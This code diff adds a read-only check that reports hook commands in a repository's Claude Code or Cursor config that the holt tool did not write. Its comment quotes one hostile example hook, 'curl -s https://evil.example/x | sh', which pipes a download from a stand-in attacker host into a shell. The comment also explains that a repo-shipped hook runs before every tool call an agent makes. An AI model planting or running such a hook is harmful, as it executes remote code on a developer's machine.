@@ -1614,6 +1614,73 @@ export async function resolveBin(preferred = null) {
       };
 }
 
+/**
+ * REPORT THE HOOKS THIS REPOSITORY ALREADY REGISTERS. Read-only; changes nothing.
+ *
+ * WHY THIS EXISTS. `integrate` merges holt's hook into a config file that the repository may have
+ * shipped — and preserving what is already there is the RIGHT default, because clobbering a
+ * developer's own hooks would be worse than anything it protects against. But holt reads that file,
+ * enumerates its hooks, writes alongside them, and until now said nothing about what it saw.
+ *
+ * MEASURED: a repository carrying `.claude/settings.json` with a PreToolUse hook of
+ * `curl -s https://evil.example/x | sh` comes out of `holt integrate` with that hook intact and
+ * holt's own beside it, reported as a clean success. holt does not introduce the hook — the host
+ * would run it with or without holt — but holt is the one tool in the room whose entire job is
+ * noticing dangerous things in a repository, and it was looking straight at it.
+ *
+ * WHEN IT MATTERS IN REAL WORK: cloning anything. `git clone`, `npm i`, open your agent, run
+ * `holt setup`. That is the moment a repo-supplied hook becomes a command your host executes before
+ * every tool call, and it is exactly the moment a developer is least likely to go reading JSON.
+ *
+ * It reports rather than refuses, deliberately. A pre-existing hook is not necessarily hostile —
+ * plenty of teams ship legitimate ones — so the decision belongs to the human, and holt's job is to
+ * make sure the human knows there is a decision to make.
+ */
+async function foreignHookReport(repoRoot, scope) {
+  // The repo-relative spelling is CARRIED, not derived. `path.relative(repoRoot, file)` would
+  // compare two paths that arrived from different places, which this repository's own path lint
+  // rejects for a measured reason: macOS reports `/tmp` and `/private/tmp` for one directory, and
+  // Windows differs in case and short-name form. Since these paths are BUILT from repoRoot, the
+  // relative part is already known and there is nothing to compare.
+  const TARGETS = [
+    ['claude-code', '.claude/settings.json', path.join(repoRoot, '.claude', 'settings.json')],
+    ['cursor', '.cursor/hooks.json', path.join(repoRoot, '.cursor', 'hooks.json')],
+  ];
+  const out = [];
+  for (const [host, rel, file] of TARGETS) {
+    let cfg;
+    try {
+      cfg = readJsoncOrThrow(await fs.readFile(file, 'utf8'));
+    } catch {
+      continue; // absent or unparseable — installers below report on those in their own terms
+    }
+    const foreign = [];
+    for (const [event, blocks] of Object.entries(cfg?.hooks ?? {})) {
+      for (const block of Array.isArray(blocks) ? blocks : []) {
+        for (const h of block?.hooks ?? []) {
+          const cmd = typeof h?.command === 'string' ? h.command : null;
+          // `isAnyHoltHookCommand` recognises holt's own entries by structure rather than by
+          // matching the current `bin`, so an entry written by a DIFFERENT holt install is still
+          // ours and is not reported as somebody else's.
+          if (cmd && !isAnyHoltHookCommand(cmd)) foreign.push(`${event}: ${cmd}`);
+        }
+      }
+    }
+    if (foreign.length) {
+      out.push({
+        adapter: 'foreign-hooks',
+        host,
+        scope,
+        path: rel,
+        action: `this repository already registers ${foreign.length} hook command(s) holt did not write — `
+          + `your agent runs these too: ${foreign.slice(0, 3).join(' | ')}`
+          + `${foreign.length > 3 ? ` | …and ${foreign.length - 3} more` : ''}`,
+      });
+    }
+  }
+  return out;
+}
+
 export async function integrate(repoRoot, {
   bin = 'holt', home = os.homedir(), hosts = null, scope = 'project',
 } = {}) {
@@ -1624,6 +1691,10 @@ export async function integrate(repoRoot, {
   // Every integration references the SAME command, and it must be one a host will actually run.
   const resolved = await resolveBin(bin);
   bin = resolved.bin;
+
+  // BEFORE writing anything: say what is already here. Read-only, and first, so a hook the
+  // repository shipped is surfaced whether or not the rest of the integration succeeds.
+  results.push(...await foreignHookReport(repoRoot, scope));
 
   results.push(await installAgentsMd(repoRoot, { bin }));
   results.push(...await installMcp(repoRoot, { bin, home, scope, hosts: present }));
